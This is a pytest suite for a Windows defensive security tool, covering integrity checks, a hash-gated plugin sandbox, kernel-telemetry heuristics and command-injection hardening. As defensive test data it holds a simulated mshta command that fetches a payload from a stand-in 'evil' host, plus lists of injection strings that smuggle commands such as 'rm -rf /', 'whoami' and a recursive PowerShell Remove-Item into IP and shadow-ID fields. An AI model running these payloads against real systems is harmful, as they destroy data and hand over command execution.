"""
tests/test_security.py — JARVIS V55.0 OMNI-REDUNDANCY security tests.

Covers the three V55.0 subsystems and their correlator wiring:
  - core.self_integrity : interpreter .text hash, module hashes, canary, exec-page walk.
  - core.plugin_loader  : SHA-256 manifest gate, restricted sandbox, severity routing.
  - core.kernel_telemetry: ETW process-create / image-load heuristics.

These are pure unit/integration tests — no ETW session, Ollama, or audio required.
Windows-only planes are skipped on non-Windows hosts.
"""
from __future__ import annotations

import asyncio
import ctypes
import hashlib
import json
import os
from pathlib import Path

import pytest

import core.kernel_telemetry as kt
import core.plugin_loader as pl
import core.self_integrity as si

_IS_WINDOWS = os.name == "nt"
_PLUGIN_DIR = Path(__file__).resolve().parent.parent / "plugins"
_EXAMPLE = _PLUGIN_DIR / "threat_escalator.example.py"
_MANIFEST = _PLUGIN_DIR / "manifest.json"


# ───────────────────────────── self_integrity ──────────────────────────────
@pytest.mark.skipif(not _IS_WINDOWS, reason="PE walk is Windows-only")
def test_text_hash_is_sha256():
    """Regression: GetModuleHandleW restype must be pointer-width (64-bit safe)."""
    h = si._text_hash()
    assert h is not None, "interpreter .text plane returned None (HMODULE truncation?)"
    assert len(h) == 64 and int(h, 16) >= 0, "must be a sha256 hex digest"


def test_module_hashes_cover_loaded_core():
    h = si._module_hashes()
    assert isinstance(h, dict)
    assert any(name.startswith(("core.", "tools.")) for name in h), \
        "should hash loaded core.*/tools.* modules"
    for digest in h.values():
        assert len(digest) == 64


def test_canary_intact_then_detects_tamper():
    assert si._check_canary() is True
    saved = ctypes.string_at(ctypes.addressof(si._canary_buf), len(si._CANARY))
    try:
        ctypes.memmove(si._canary_buf, b"X" * len(si._CANARY), len(si._CANARY))
        assert si._check_canary() is False, "tampered canary must fail the check"
    finally:
        ctypes.memmove(si._canary_buf, saved, len(saved))
    assert si._check_canary() is True, "canary must verify clean after restore"


@pytest.mark.skipif(not _IS_WINDOWS, reason="VirtualQuery is Windows-only")
def test_exec_pages_returns_set():
    pages = si._exec_pages()
    assert isinstance(pages, set)
    assert all(isinstance(p, int) for p in pages)


# ───────────────────────────── plugin_loader ───────────────────────────────
def test_sandbox_blocks_open():
    fn = pl._compile_one("evil_open", "def analyze(e):\n    return open('x')")
    assert callable(fn)
    with pytest.raises(Exception):
        fn({"severity": 9})


def test_sandbox_blocks_dynamic_import():
    fn = pl._compile_one("evil_import", "def analyze(e):\n    return __import__('os')")
    assert callable(fn)
    with pytest.raises(Exception):
        fn({})


def test_compile_rejects_missing_analyze():
    assert pl._compile_one("no_entry", "x = 1") is None


@pytest.fixture
def restore_manifest():
    """Snapshot and restore plugins/manifest.json + LOADED_PLUGINS around a test."""
    orig = _MANIFEST.read_text(encoding="utf-8") if _MANIFEST.exists() else "[]"
    saved = dict(pl.LOADED_PLUGINS)
    yield
    _MANIFEST.write_text(orig, encoding="utf-8")
    pl.LOADED_PLUGINS.clear()
    pl.LOADED_PLUGINS.update(saved)


def _write_manifest(sha: str):
    _MANIFEST.write_text(json.dumps([{
        "name": "threat_escalator", "file": "threat_escalator.example.py",
        "sha256": sha, "version": "0.1", "enabled": True,
    }], indent=2), encoding="utf-8")


def test_loads_sha_verified_plugin(restore_manifest):
    digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
    _write_manifest(digest)
    pl.LOADED_PLUGINS.clear()
    pl.load_all()
    assert "threat_escalator" in pl.LOADED_PLUGINS


def test_refuses_sha_mismatch(restore_manifest):
    _write_manifest("deadbeef" * 8)
    pl.LOADED_PLUGINS.clear()
    pl.load_all()
    assert "threat_escalator" not in pl.LOADED_PLUGINS


class _FakeCorrelator:
    def __init__(self):
        self.ingested = []

    async def ingest_event(self, ev):
        self.ingested.append(ev)


def test_route_event_escalates(restore_manifest):
    digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
    _write_manifest(digest)
    pl.LOADED_PLUGINS.clear()
    pl.load_all()
    fc = _FakeCorrelator()
    pl._correlator = fc

    async def drive():
        await pl.route_event({"severity": 9.0, "attck": ["T1055", "T1041"], "type": "x"})
        await asyncio.sleep(0.1)

    asyncio.run(drive())
    assert fc.ingested, "eligible event should be re-ingested"
    assert fc.ingested[0]["severity"] == 10.0
    assert fc.ingested[0]["_plugin_enriched"] is True


def test_route_event_skips_low_severity(restore_manifest):
    digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
    _write_manifest(digest)
    pl.LOADED_PLUGINS.clear()
    pl.load_all()
    fc = _FakeCorrelator()
    pl._correlator = fc

    async def drive():
        await pl.route_event({"severity": 3.0, "attck": ["T1055", "T1041"]})
        await asyncio.sleep(0.1)

    asyncio.run(drive())
    assert not fc.ingested


def test_route_event_loop_guard(restore_manifest):
    digest = hashlib.sha256(_EXAMPLE.read_bytes()).hexdigest()
    _write_manifest(digest)
    pl.LOADED_PLUGINS.clear()
    pl.load_all()
    fc = _FakeCorrelator()
    pl._correlator = fc

    async def drive():
        await pl.route_event({"severity": 10.0, "attck": ["T1055", "T1041"],
                              "_plugin_enriched": True})
        await asyncio.sleep(0.1)

    asyncio.run(drive())
    assert not fc.ingested, "already-enriched events must not re-route"


# ──────────────────────────── kernel_telemetry ─────────────────────────────
def test_analyze_flags_lolbin_and_suspicious_dll(monkeypatch):
    emitted = []
    monkeypatch.setattr(kt, "_emit",
                        lambda kind, sev, attck, extra: emitted.append((kind, sev, extra)))
    kt._analyze({"EventID": 1, "ImageName": r"C:\Windows\System32\mshta.exe",
                 "CommandLine": "mshta http://evil/x.hta",
                 "ProcessId": "123", "ParentProcessId": "4"})
    kt._analyze({"EventID": 5,
                 "ImageName": r"C:\Users\bob\AppData\Local\Temp\evil.dll",
                 "ProcessId": "55"})
    kinds = [e[0] for e in emitted]
    assert "kernel_process_create" in kinds
    assert "kernel_image_load" in kinds


def test_analyze_ignores_benign_process(monkeypatch):
    emitted = []
    monkeypatch.setattr(kt, "_emit",
                        lambda kind, sev, attck, extra: emitted.append(kind))
    kt._analyze({"EventID": 1, "ImageName": r"C:\Windows\System32\notepad.exe",
                 "CommandLine": "notepad", "ProcessId": "99", "ParentProcessId": "4"})
    assert not emitted, "benign system-path process should not alert"


# ─────────── active-defense command-injection hardening (post-review) ──────────
# core.punisher / core.network_quarantine / core.vss_vaccine build OS commands
# from attacker-influenced telemetry (incident IPs, shadow-copy IDs) and
# auto-execute with zero human confirmation above a severity threshold. These
# tests lock down the two guarantees that matter: (1) malformed input is
# rejected before it ever reaches a subprocess, and (2) shell=True — which
# would let injected metacharacters be reinterpreted as command syntax —
# never comes back into these files.

import re as _re

import core.network_quarantine as nq
import core.punisher as punisher
import core.vss_vaccine as vss
from core.rbac_manager import ActorContext, ClearanceLevel

_INJECTION_PAYLOADS = [
    "1.1.1.1 & calc.exe",
    "1.1.1.1; rm -rf /",
    '1.1.1.1" & whoami & "',
    "8.8.8.8`nRemove-Item C:\\",
    "not-an-ip-at-all",
    "",
]

_SHADOW_ID_INJECTION_PAYLOADS = [
    "'} ; Remove-Item C:\\ -Recurse -Force ; if ($true) { Write-Output '",
    "not-a-guid",
    "",
]


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_punisher_rejects_malformed_ip_literals(payload):
    assert punisher._valid_ip(payload) is False


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_network_quarantine_rejects_malformed_ip_literals(payload):
    assert nq._valid_ip(payload) is False


def test_valid_ip_literals_are_accepted():
    assert punisher._valid_ip("8.8.8.8") is True
    assert nq._valid_ip("2001:4860:4860::8888") is True


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_punisher_isolate_ip_never_shells_out_on_bad_input(payload, monkeypatch):
    calls = []
    monkeypatch.setattr(punisher.subprocess, "run",
                        lambda *a, **kw: calls.append((a, kw)))
    ok = asyncio.run(punisher.isolate_ip(payload, reason="test"))
    assert ok is False
    assert not calls, "malformed ip must be rejected before any subprocess call"


@pytest.mark.parametrize("payload", _INJECTION_PAYLOADS)
def test_network_quarantine_release_never_shells_out_on_bad_input(payload, monkeypatch):
    calls = []
    monkeypatch.setattr(nq, "_run", lambda cmd: calls.append(cmd) or (0, ""))
    res = asyncio.run(nq.release(
        payload, actor=ActorContext(identity="test", clearance=ClearanceLevel.L3_Hunter)
    ))
    assert res["released"] is False
    assert not calls, "malformed ip must be rejected before any subprocess call"


def test_network_quarantine_rejects_malformed_ip_even_when_admin(monkeypatch):
    """quarantine()'s admin gate runs first — force it True so the ip-validation
    branch underneath is actually exercised regardless of the host running
    the test suite."""
    monkeypatch.setattr(nq, "_IS_WINDOWS", True)
    monkeypatch.setattr(nq, "_is_admin", lambda: True)
    calls = []
    monkeypatch.setattr(nq, "_run", lambda cmd: calls.append(cmd) or (0, ""))
    res = asyncio.run(nq.quarantine(
        "1.1.1.1 & calc.exe",
        actor=ActorContext(identity="test", clearance=ClearanceLevel.L3_Hunter),
    ))
    assert res["skipped"] == "invalid IP literal"
    assert not calls


@pytest.mark.parametrize("payload", _SHADOW_ID_INJECTION_PAYLOADS)
def test_vss_vaccine_rejects_malformed_shadow_ids(payload):
    assert vss._valid_shadow_id(payload) is False


def test_vss_vaccine_accepts_real_shadow_id_shape():
    assert vss._valid_shadow_id("{3D6BB79C-1234-4A2B-9C3D-1234567890AB}") is True


@pytest.mark.parametrize("payload", _SHADOW_ID_INJECTION_PAYLOADS)
def test_vss_vaccine_delete_never_shells_out_on_bad_shadow_id(payload, monkeypatch):
    calls = []
    monkeypatch.setattr(vss, "_run_ps", lambda *a, **kw: calls.append((a, kw)))
    ok = vss._delete_blocking(payload)
    assert ok is False
    assert not calls, "malformed shadow_id must be rejected before any subprocess call"


@pytest.mark.parametrize("mod_path", [
    "core/punisher.py",
    "core/network_quarantine.py",
    "core/vss_vaccine.py",
])
def test_active_defense_modules_never_use_shell_true(mod_path):
    """Regression guard: these modules auto-execute OS commands built from
    attacker-influenced telemetry with zero HITL above a severity threshold.
    shell=True would let injected metacharacters be reinterpreted as command
    syntax — it must never come back."""
    src = (Path(__file__).resolve().parent.parent / mod_path).read_text(encoding="utf-8")
    assert not _re.search(r"shell\s*=\s*True", src), f"{mod_path} reintroduced shell=True"
